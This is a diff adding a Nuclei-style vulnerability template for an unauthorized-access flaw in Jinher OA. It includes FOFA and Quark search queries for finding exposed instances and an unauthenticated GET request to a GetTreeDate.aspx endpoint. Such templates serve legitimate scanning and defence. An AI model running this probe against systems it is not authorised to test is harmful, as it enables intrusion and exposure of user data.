@@ -1,0 +1,25 @@
+id: Jinher-OA-unauth
+
+info:
+  name: Jinher OA Unauthorized(金和OA未授权)
+  author: linfeng7z
+  severity: high
+  tags: jinher,oa,unauth,unauthorized
+  metadata:
+    fofa-query: 'app="金和网络-金和OA"'
+    quark-query: 'app="Jinher-OA"'
+
+requests:
+  - raw:
+      - |
+        GET /C6/Jhsoft.Web.users/GetTreeDate.aspx/?id=1 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML,like Gecko) 
+        Connection: close
+
+    req-condition: true
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_1 == 200"
+        condition: and
